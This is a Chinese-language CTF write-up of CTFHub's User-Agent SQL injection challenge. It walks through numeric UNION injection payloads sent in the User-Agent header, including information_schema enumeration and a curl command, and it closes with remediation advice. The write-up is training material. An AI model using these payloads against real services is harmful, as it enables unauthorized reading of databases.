CTFHub - Web - SQL注入 - UA注入

# CTFHub # Web # SQL注入 # UA注入 # UNION注入

一、题目信息

  • 题目名称：UA注入
  • 题目方向：Web - SQL注入
  • 题目环境：动态分配的 HTTP 服务地址
  • 题目目标：从 User-Agent 注入点读取数据库中的 flag。

二、定位注入点

首次访问页面时，服务端直接提示输入点在 User-Agent，并回显默认请求对应的 SQL：

select * from news where id=curl/8.21.0

将 User-Agent 改为 1 后，查询语句和结果同步变化：

User-Agent: 1

select * from news where id=1
ID: 1
Data: ctfhub

这说明 User-Agent 的值未经处理便进入了 SQL 查询，且 id 两侧没有引号，属于数字型注入。

User-Agent 虽然是 HTTP 请求头，但同样完全由客户端控制。服务端将其视为可信数据并拼接 SQL，就会形成 UA 注入。

三、确定回显列数

原查询返回 id 和内容两列。使用不存在的负数 -1 避免优先返回原记录，再通过 UNION 放置两个测试值：

User-Agent: -1 union select 111,222

select * from news where id=-1 union select 111,222
ID: 111
Data: 222

两个列位均成功回显，可确认查询共有两列。

四、获取数据库基本信息

User-Agent: -1 union select database(),user()

ID: sqli
Data: root@localhost
User-Agent: -1 union select version(),@@version_compile_os

ID: 10.3.22-MariaDB-0+deb10u1
Data: debian-linux-gnu

目标数据库为 sqli，数据库类型为 MariaDB。下一步通过 information_schema 枚举表名和字段名。

五、枚举表和字段

查询当前数据库中的全部表名：

User-Agent: -1 union select 1,group_concat(table_name)
from information_schema.tables
where table_schema=database()

ID: 1
Data: news,meavyzbvxv

除业务表 news 外，还存在随机表名 meavyzbvxv。继续查询该表的字段：

User-Agent: -1 union select 1,group_concat(column_name)
from information_schema.columns
where table_schema=database()
and table_name='meavyzbvxv'

ID: 1
Data: zxspefkdzi

目标数据位于 meavyzbvxv.zxspefkdzi。随机名称会随题目环境重新分配，实际解题时以当前查询结果为准。

六、读取 Flag

User-Agent: -1 union select 1,zxspefkdzi
from meavyzbvxv

ID: 1
Data: ctfhub{052ccd06a44702cbf9c727c0}

使用 curl 复现完整请求：

curl.exe -sS -A "-1 union select 1,zxspefkdzi from meavyzbvxv" "http://<target>/"

七、最终 Flag

ctfhub{052ccd06a44702cbf9c727c0}

八、修复建议

  • 使用预处理语句和参数绑定，禁止将 User-Agent 等请求头直接拼接进 SQL。
  • 对参与查询的字段执行严格的整数类型校验，只接受合法数字。
  • 生产环境关闭 SQL 语句回显和详细数据库错误信息。
  • 数据库账号遵循最小权限原则，限制对 information_schema 和业务表的访问。
  • 所有 HTTP 输入都应视为不可信数据，包括 URL、Cookie、请求头和请求体。

九、解题总结

本题与 Cookie 注入的思路一致，只是注入位置变成了 User-Agent。确认请求头被直接拼接到 SQL 后，可沿用数字型注入流程：用 -1 避开原记录并验证 UNION 回显列，枚举当前数据库结构，最后读取目标字段。
